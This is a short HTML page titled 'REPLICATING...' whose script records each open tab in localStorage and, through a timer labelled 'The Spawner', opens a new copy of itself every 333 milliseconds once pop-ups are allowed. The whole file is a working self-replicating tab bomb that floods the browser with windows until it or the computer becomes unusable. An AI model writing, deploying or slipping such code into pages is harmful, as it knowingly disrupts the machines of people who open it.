<!DOCTYPE html>
<html>
<head>
    <title>REPLICATING...</title>
</head>
<body style="background:black; color:red; font-family:monospace; text-align:center;">
    <h1>INSTANCE ACTIVE</h1>
    <script>
        // Unique ID for this tab
        const id = "tab_" + Math.random().toString(36).substr(2, 9);
        
        // 1. Tell the counter we are alive
        setInterval(() => {
            localStorage.setItem(id, Date.now());
        }, 1000);

        // 2. The Spawner (No Button)
        // This will only work after you click "Always allow pop-ups" once.
        setInterval(() => {
            window.open("index.html", "_blank");
        }, 333); 
    </script>
</body>
</html>
